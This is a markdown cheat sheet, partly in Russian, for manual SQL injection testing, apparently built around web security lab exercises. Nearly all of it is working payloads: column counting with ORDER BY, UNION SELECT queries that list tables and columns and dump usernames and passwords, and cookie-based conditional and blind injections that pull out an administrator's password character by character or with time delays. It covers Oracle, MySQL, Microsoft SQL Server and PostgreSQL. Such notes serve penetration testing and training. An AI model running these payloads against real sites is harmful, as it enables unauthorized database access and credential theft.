# Ручное тестирование

### Определение точки ввода
1. Поиск ошибки через указание ошибочного запроса пользователя
```SQL
'
" 
--
```

2. Determining the number of columns required
```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# MySQL and Microsoft SQL Server
'+UNION+SELECT+'abc','def','gho'#
'+UNION+SELECT+@@version,+NULL#

# Non Oracle
' UNION SELECT 'abc','def'--
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- # in case of data in 1 param

# Oracle
' UNION SELECT 'abc','def' FROM dual--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

3. Finding columns with a useful data type
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

4. Conditional
```sql
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

5. Blind
```sql
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
Cookie: TrackingId=x'||pg_sleep(10)--
```

### Извлечение информации через уязвимый параметр

1. Database version
```SQL
Oracle: 	UNION SELECT BANNER, NULL FROM v$version--
            SELECT banner FROM v$version
            SELECT version FROM v$instance
            SELECT * FROM v$version
Microsoft:	SELECT @@version
MySQL:  	SELECT @@version
PostgreSQL:	SELECT version()
```

2. Retrieving multiple values within a single column
```SQL
' UNION SELECT NULL,username || '~' || password FROM users,NULL--

Oracle: 	'foo'||'bar'
Microsoft	'foo'+'bar'
PostgreSQL	'foo'||'bar'
MySQL:  	'foo' 'bar' [Note the space between the two strings]
            CONCAT('foo','bar')
```

3. Database contents / Find TABLE NAME
```SQL
#Oracle	
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

#Microsoft
table_name||FROM+information_schema.tables
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

# PostgreSQL из первого параметра. Второй используется как завершение логики запроса
UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- # Извлекаем название ТАБЛИЦ
UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_tecdsk'-- # Извлекаем название строк
UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef-- # Извлекаем содержимое строк

# MySQL	
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

# Автоматизация тестирования
```
sqlmap

```